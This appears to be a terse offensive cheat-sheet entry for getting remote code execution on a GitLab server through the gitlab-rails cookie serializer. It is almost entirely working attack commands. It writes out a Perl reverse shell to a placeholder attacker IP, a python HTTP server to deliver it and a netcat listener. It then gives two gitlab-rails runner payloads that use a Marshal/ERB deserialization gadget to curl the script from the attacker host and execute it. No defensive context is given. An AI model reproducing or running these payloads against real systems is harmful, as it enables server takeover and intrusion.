# gitlab

## gitlab-rails

### :hybrid cookies_serializer rce

    # on attacker:
    # create a reverse shell
    $ cat run.sh
    perl -e 'use Socket;$i="<ATTACKER_IP>";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    # deliver reverse shell
    $ python3 -m http.server 8000
    # listen for a reverse shell
    $ nc -v -l -p 6666

    # on victim's gitlab server:
    # pull the perl reverse shell
    $ gitlab-rails runner 'request = ActionDispatch::Request.new(Rails.application.env_config);request.env["action_dispatch.cookies_serializer"] = :marshal;cookies = request.cookie_jar; erb = ERB.new("<%= `curl http://<ATTACKER_IP>:8000/run.sh -o /tmp/run.sh` %>"); depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new); cookies.signed[:cookie] = depr; puts cookies[:cookie]'
    # trigger the reverse shell
    $ gitlab-rails runner 'request = ActionDispatch::Request.new(Rails.application.env_config);request.env["action_dispatch.cookies_serializer"] = :marshal;cookies = request.cookie_jar;erb = ERB.new("<%= `bash /tmp/run.sh` %>");depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new);cookies.signed[:cookie] = depr;puts cookies[:cookie]'
